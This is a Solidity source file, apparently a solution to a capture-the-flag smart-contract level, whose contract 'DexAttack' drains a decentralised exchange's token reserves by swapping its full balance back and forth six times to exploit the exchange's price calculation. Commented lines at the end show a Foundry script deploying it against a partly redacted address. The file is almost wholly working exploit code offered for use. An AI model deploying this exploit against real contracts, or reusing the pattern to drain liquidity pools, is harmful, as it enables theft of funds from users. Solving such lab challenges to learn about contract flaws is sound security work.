// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { Dex } from "./DexOne.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract DexAttack{
    Dex victim;
    constructor(address _v) {
        victim = Dex(payable(_v));
        victim.approve(address(this), 100000);
        
    }

    function transferHAH() public {
        IERC20(victim.token1()).transferFrom(msg.sender, address(this), 10);
        IERC20(victim.token2()).transferFrom(msg.sender, address(this), 10);
    }

    function attack() public {
        
        victim.approve(address(victim), 100000);
            victim.swap(victim.token1(), victim.token2(), IERC20(victim.token1()).balanceOf(address(this)));
            victim.swap(victim.token2(), victim.token1(), IERC20(victim.token2()).balanceOf(address(this)));
            victim.swap(victim.token1(), victim.token2(), IERC20(victim.token1()).balanceOf(address(this)));
            victim.swap(victim.token2(), victim.token1(), IERC20(victim.token2()).balanceOf(address(this)));
            victim.swap(victim.token1(), victim.token2(), IERC20(victim.token1()).balanceOf(address(this)));
            victim.swap(victim.token2(), victim.token1(), 45);
    }
} 


//         DexAttack victim = new DexAttack(0xA3674cEA5DFc..);
//         Dex dex = Dex(0xA3674cEA5DFc..);
//         dex.approve(address(victim), 10000);
//         victim.transferHAH();
//         victim.attack();
//         vm.stopBroadcast();
//   
